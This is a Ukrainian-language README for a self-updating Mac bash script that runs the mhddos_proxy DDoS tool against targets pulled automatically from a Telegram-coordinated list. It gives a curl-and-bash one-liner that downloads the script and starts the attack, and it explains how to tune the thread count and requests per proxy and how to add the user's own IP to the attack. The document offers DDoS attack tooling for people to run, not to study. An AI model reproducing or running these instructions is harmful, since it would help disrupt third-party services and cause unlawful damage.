# Опис auto_mhddos_mac

runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) bash-скрипт для Mac-машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)  
Також він автоматично оновлює не лише свій скрипт та цілі, а й сам скрипт mhddos_proxy  
Також скрипт імітує роботу людини (вимикає увесь ДДоС на 1-2 (рандомно) хвилин), щоб дати машині трохи відпочити
Скрипт розподіляє список машин по цілям: https://github.com/alexnest-ua/targets/blob/main/targets_linux  
  
[**Варіант для Windows**](https://github.com/alexnest-ua/runner_for_windows)  
[**Варіант для Linux**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/main)  
[**Варіант для Docker**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/docker)    
  
можете запускати цей скрипт на увесь день та йти по своїм справам - він сам буде брати актуальні цілі  

**якщо запускаєте цей скрипт - інші атаки через Python не запускайте, бо при рестарті він вбиває усі процеси старі процеси з mhddos_proxy (щоб старі атаки не накопичувалися)**

Канал, де координуються цілі: https://t.me/ddos_separ (звідти і беруться сюди цілі, тому якщо у вас на Mac запущено цей скрипт - то можете відповчивати, він все зробить за вас)  
чат де ви можете задати свої питання: https://t.me/+8swDHSe_ROI5MmJi  
також можете писати мені в особисті у телеграм, я завжди усім відповідаю: @brainqdead
  
Туторіал по створенню автоматичних та автономних Linux-серверів: https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c  

# Запуск скрипта
1) Заходимо в Launchpad, щоб відкрити термінал  
![image](https://user-images.githubusercontent.com/74729549/167318008-ec0e5caf-dc57-4d29-a352-8b41c49d4fe2.png)
2) У пошуку вбиваємо terminal  
![image](https://user-images.githubusercontent.com/74729549/167318025-d7d89817-4e83-4118-8c35-fbf37e59fdea.png)
3) Запускаємо Термінал  
![image](https://user-images.githubusercontent.com/74729549/167318042-f892bec6-7a8b-4ad7-aed1-f625f2e92fd4.png)
4) Вводимо команду, яка сама завантантажить усе необхідне та запустить атаку (на початку можливо у вас попросить **ваш пароль**, та після цього натиснути Enter, щоб підтвердити встановлення потрібнго пакету (brew))
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh
```
  
Буде запущено атаку з наступними параметрами за замовчуванням: threads=1500 rpc=1000 debug="" vpn=""(1500 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу, без атаки через ваш ІР)
  
**!!!УВАГА!!!** runner.sh підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 2)), але можно і без них:  
curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh [threads] [rpc] [debug] [vpn]  
- threads - кількість потоків (але не менше 1000, та не більше 4000)
- rpc - кількість запитів на проксі перед відправкою на ціль (але не менше 1000, та не більше 2500)
- debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
- vpn - використання вашого ІР у атаці разом з проксі

**ви можете змінювати параметри на будь-які інші значення, але я рекомендую саме ті, що за замовчуванням.**  
**також можете додавати **3-тим** параметром --debug, що слідкувати за ходом атаки, та **4-тим** параметром --vpn, щоб атакувати ще й через свій ІР разом з проксі**  
*наприклад команда з 2500 threads 2000 rpc дебагом та доп. атакою через ваш ІР*  
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh 2500 2000 --debug --vpn
```

#test1
